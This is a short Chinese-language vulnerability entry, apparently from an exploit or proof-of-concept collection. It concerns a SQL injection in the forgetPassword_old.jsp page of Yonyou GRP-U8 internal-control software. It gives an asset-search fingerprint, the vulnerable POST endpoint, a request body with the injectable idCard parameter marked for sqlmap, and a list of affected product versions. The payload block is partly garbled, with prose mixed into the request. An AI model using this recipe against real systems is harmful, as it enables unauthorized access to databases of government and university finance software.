# 用友GRP-U8forgetPassword_old.jsp存在sql注入

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="用友GRP-U8 OA"`
- **请求**：`POST /u8qx/forgetPassword_old.jsp?action=save HTTP/1.1`

**请求体 / payload**
```
访问`/u8qx/forgetPassword_old.jsp?action=save`出现如下界面表示可能存在漏洞\
Host: xx.xx.xx.xx
Content-Length: 43
Content-Type: application/x-www-form-urlencoded
idCard=1*&inputDW=1&userName=1
sqlmap\
```

**其他**
- 用友GRP-U8 forgetPassword\_old.jsp 存在sql注入: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友GRP-U8 行政事业内控管理软件（新政府会计制度专版）
* 用友GRP-U8 高校内控管理软件（Manager版）